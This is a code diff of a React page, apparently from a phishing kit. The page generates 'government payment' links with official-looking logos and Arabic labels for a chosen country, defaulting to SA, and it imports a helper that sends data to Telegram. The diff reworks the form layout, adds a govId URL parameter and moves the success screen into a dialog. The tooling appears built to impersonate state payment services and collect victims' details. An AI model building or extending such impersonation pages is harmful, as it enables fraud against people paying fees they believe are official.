@@ -24,10 +24,19 @@ import {
   Lock,
   ArrowRight,
   Info,
-  RefreshCw
+  RefreshCw,
+  Hash,
+  ShieldCheck
 } from "lucide-react";
 import BackButton from "@/components/BackButton";
 import { sendToTelegram } from "@/lib/telegram";
+import {
+  AlertDialog,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 const GovernmentPaymentLinkCreator = () => {
   const { country, serviceKey } = useParams();
@@ -84,16 +93,17 @@ const GovernmentPaymentLinkCreator = () => {
           service_key: serviceKey,
           service_name: govService.nameAr,
           customerInfo: { fullName, phoneNumber, email },
-          payment_amount: parseFloat(amount),
+          cod_amount: parseFloat(amount),
           currency_code: getCurrencyCode(country || govService.country),
           reference,
           description,
           selectedCountry: country || govService.country,
           payment_method: paymentMethod,
+          govId: country || 'SA'
         },
       });
 
-      const paymentUrl = `${window.location.origin}/r/${country || 'SA'}/government/${link.id}`;
+      const paymentUrl = `${window.location.origin}/r/${country || 'SA'}/government/${link.id}?govId=${country || 'SA'}`;
       setCreatedLink(paymentUrl);
       setLinkId(link.id);
       setShowSuccess(true);
@@ -119,58 +129,123 @@ const GovernmentPaymentLinkCreator = () => {
     }
   };
 
-  if (showSuccess) {
-    return (
-      <div className="min-h-screen flex items-center justify-center py-6 px-4 bg-gray-50" dir="rtl">
-        <Card className="max-w-xl w-full overflow-hidden border-0 shadow-2xl bg-white rounded-[2rem]">
-          <div className="p-8 text-center relative overflow-hidden" style={{ background: govSystem.gradients.header }}>
-            <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-white/20 flex items-center justify-center border-2 border-white/30"><CheckCircle className="w-10 h-10 text-white" /></div>
-            <h2 className="text-2xl font-black text-white">رابط السداد جاهز</h2>
-          </div>
-          <div className="p-6 sm:p-10 space-y-6">
-            <div className="p-4 rounded-xl border-2 bg-gray-50 break-all text-xs font-mono">{createdLink}</div>
-            <div className="grid grid-cols-2 gap-3">
-              <Button onClick={() => { navigator.clipboard.writeText(createdLink); toast({ title: "تم النسخ" }); }} className="h-14 rounded-xl font-black" style={{ background: govSystem.gradients.primary }}><Copy className="w-4 h-4 ml-2" /> نسخ</Button>
-              <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="h-14 rounded-xl border-2 font-black" style={{ borderColor: primaryColor, color: primaryColor }}><ExternalLink className="w-4 h-4 ml-2" /> معاينة</Button>
-            </div>
-            <Button onClick={() => navigate('/services')} variant="ghost" className="w-full text-gray-400 font-bold">العودة للخدمات</Button>
-          </div>
-        </Card>
-      </div>
-    );
-  }
 
   return (
-    <div className="min-h-screen py-4 px-2 bg-gray-50" dir="rtl">
-      <div className="container mx-auto max-w-2xl">
-        <div className="mb-4 px-2"><BackButton /></div>
-
-        <Card className="overflow-hidden border-0 shadow-2xl bg-white rounded-[2rem]">
-          <div className="p-6 sm:p-8 relative flex items-center gap-4" style={{ background: govSystem.gradients.header }}>
-            <div className="w-12 h-12 rounded-xl bg-white/20 flex items-center justify-center border border-white/30 shadow-xl"><Landmark className="w-6 h-6 text-white" /></div>
-            <div>
-              <h1 className="text-lg sm:text-2xl font-black text-white">{govService.nameAr}</h1>
-              <p className="text-[10px] text-white/80 font-bold uppercase tracking-widest">{govSystem.nameEn} Portal</p>
+    <div className="min-h-screen bg-slate-50" dir="rtl">
+      <header className="bg-white border-b h-16 flex items-center px-4 sticky top-0 z-50 shadow-sm">
+        <div className="container mx-auto flex justify-between items-center">
+          <div className="flex items-center gap-2">
+            <div className="w-8 h-8 rounded-lg flex items-center justify-center text-white" style={{ background: primaryColor }}>
+              <Landmark className="w-5 h-5" />
             </div>
+            <h1 className="font-black text-gray-800">بوابة السداد الحكومي</h1>
           </div>
+          <BackButton />
+        </div>
+      </header>
 
-          <form onSubmit={handleSubmit} className="p-6 sm:p-8 space-y-4 sm:space-y-6">
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-              <div className="space-y-1.5"><Label className="text-[10px] font-black text-gray-400 uppercase">اسم المستفيد</Label><Input value={fullName} onChange={(e) => setFullName(e.target.value)} placeholder="الاسم الكامل" required className="h-12 border-2 rounded-xl text-base font-bold" /></div>
-              <div className="space-y-1.5"><Label className="text-[10px] font-black text-gray-400 uppercase">رقم الجوال</Label><Input value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} placeholder="05XXXXXXXX" required className="h-12 border-2 rounded-xl text-base font-bold text-left" dir="ltr" /></div>
-            </div>
+      <main className="container mx-auto px-4 py-6 max-w-xl">
+        <form onSubmit={handleSubmit} className="space-y-4">
+           <Card className="p-6 border-2 rounded-3xl shadow-xl space-y-6">
+              <div className="p-4 rounded-2xl flex items-center gap-4 animate-in fade-in slide-in-from-top-2" style={{ background: `${primaryColor}10`, border: `1px solid ${primaryColor}20` }}>
+                <img src={govSystem?.logo} alt="" className="h-10 w-20 object-contain" />
+                <div>
+                  <h4 className="font-black text-sm" style={{ color: primaryColor }}>{govService.nameAr}</h4>
+                  <p className="text-[10px] font-bold opacity-70">{govSystem?.description}</p>
+                </div>
+              </div>
 
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-              <div className="space-y-1.5"><Label className="text-[10px] font-black text-gray-400 uppercase">المبلغ المطلوب</Label><div className="relative"><Input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} required className="h-12 border-2 rounded-xl text-lg font-black pl-10" /><div className="absolute left-3 top-1/2 -translate-y-1/2 text-[10px] font-black text-gray-400">{getCurrencySymbol(country || govService.country)}</div></div></div>
-              <div className="space-y-1.5"><Label className="text-[10px] font-black text-gray-400 uppercase">رقم المرجع (اختياري)</Label><Input value={reference} onChange={(e) => setReference(e.target.value)} placeholder="INV-XXXX" className="h-12 border-2 rounded-xl text-base font-bold" /></div>
-            </div>
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div className="space-y-1.5">
+                  <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">اسم المستفيد</Label>
+                  <div className="relative">
+                    <Input value={fullName} onChange={(e) => setFullName(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" placeholder="الاسم الكامل" />
+                    <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
+                  </div>
+                </div>
+                <div className="space-y-1.5">
+                  <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">رقم الجوال</Label>
+                  <div className="relative">
+                    <Input value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10 text-left" dir="ltr" placeholder="05XXXXXXXX" />
+                    <Phone className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
+                  </div>
+                </div>
+              </div>
 
-            <Button type="submit" disabled={isSubmitting} className="w-full h-14 sm:h-16 rounded-xl sm:rounded-2xl text-lg sm:text-xl font-black shadow-xl transition-all" style={{ background: govSystem.gradients.primary }}>
-              {isSubmitting ? <RefreshCw className="w-5 h-5 animate-spin" /> : <><Lock className="w-5 h-5 ml-2" /> إصدار رابط السداد</>}
-            </Button>
-          </form>
-        </Card>
-      </div>
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div className="space-y-1.5">
+                   <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">المبلغ المطلوب</Label>
+                   <div className="relative">
+                     <Input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
+                     <div className="absolute right-3 top-1/2 -translate-y-1/2 font-bold text-gray-300 text-[10px]">{getCurrencySymbol(country || govService.country)}</div>
+                   </div>
+                </div>
+                <div className="space-y-1.5">
+                  <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">رقم المرجع</Label>
+                  <div className="relative">
+                    <Input value={reference} onChange={(e) => setReference(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" placeholder="INV-XXXX" />
+                    <Hash className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
+                  </div>
+                </div>
+              </div>
+
+              <div className="space-y-1.5">
+                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">وصف الرسوم</Label>
+                <div className="relative">
+                  <Input value={description} onChange={(e) => setDescription(e.target.value)} placeholder="مثال: رسوم تجديد، غرامة..." className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
+                  <FileText className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
+                </div>
+              </div>
+
+              {parseFloat(amount) > 0 && (
+                <div className="p-4 rounded-2xl bg-slate-900 text-white animate-in zoom-in-95 duration-300">
+                  <div className="flex justify-between items-center mb-2">
+                    <span className="text-[10px] font-bold text-slate-400 uppercase">المبلغ الإجمالي</span>
+                    <Shield className="w-4 h-4 text-green-400" />
+                  </div>
+                  <div className="flex items-baseline gap-2">
+                    <span className="text-3xl font-black">{amount}</span>
+                    <span className="text-xs font-bold text-slate-400">{getCurrencySymbol(country || govService.country)}</span>
+                  </div>
+                </div>
+              )}
+           </Card>
+
+           <Button type="submit" disabled={isSubmitting} className="w-full h-16 rounded-3xl font-black text-lg shadow-xl text-white transition-all active:scale-95" style={{ background: govSystem?.gradients?.primary || primaryColor }}>
+             {isSubmitting ? <RefreshCw className="w-6 h-6 animate-spin" /> : <><ShieldCheck className="w-5 h-5 ml-2" /> إصدار رابط سداد حكومي</>}
+           </Button>
+        </form>
+      </main>
+
+      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
+        <AlertDialogContent className="max-w-[90%] rounded-3xl border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
+           <div className="p-8 text-center space-y-6">
+              <div className="w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-2" style={{ background: `${primaryColor}15` }}>
+                <div className="w-12 h-12 rounded-full flex items-center justify-center animate-bounce" style={{ background: primaryColor }}>
+                  <RefreshCw className="w-6 h-6 text-white" />
+                </div>
+              </div>
+              <div>
+                <AlertDialogTitle className="text-2xl font-black text-gray-900">رابط السداد جاهز!</AlertDialogTitle>
+                <AlertDialogDescription className="font-bold text-gray-500">تم توليد رابط دفع آمن لهذه الخدمة الحكومية</AlertDialogDescription>
+              </div>
+
+              <div className="bg-gray-50 p-4 rounded-2xl border-2 border-dashed border-gray-200 break-all font-mono text-xs font-bold text-gray-400">
+                {createdLink}
+              </div>
+
+              <div className="flex gap-3">
+                 <Button onClick={() => { navigator.clipboard.writeText(createdLink); toast({ title: "تم النسخ" }); }} className="flex-1 h-14 rounded-2xl font-black bg-gray-900 text-white gap-2">
+                   <Copy className="w-4 h-4" /> نسخ الرابط
+                 </Button>
+                 <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-14 rounded-2xl font-black border-2 gap-2 text-gray-700">
+                   <ExternalLink className="w-4 h-4" /> معاينة
+                 </Button>
+              </div>
+              <Button variant="ghost" onClick={() => setShowSuccess(false)} className="w-full font-bold text-gray-400">إغلاق</Button>
+           </div>
+        </AlertDialogContent>
+      </AlertDialog>
     </div>
   );
 };
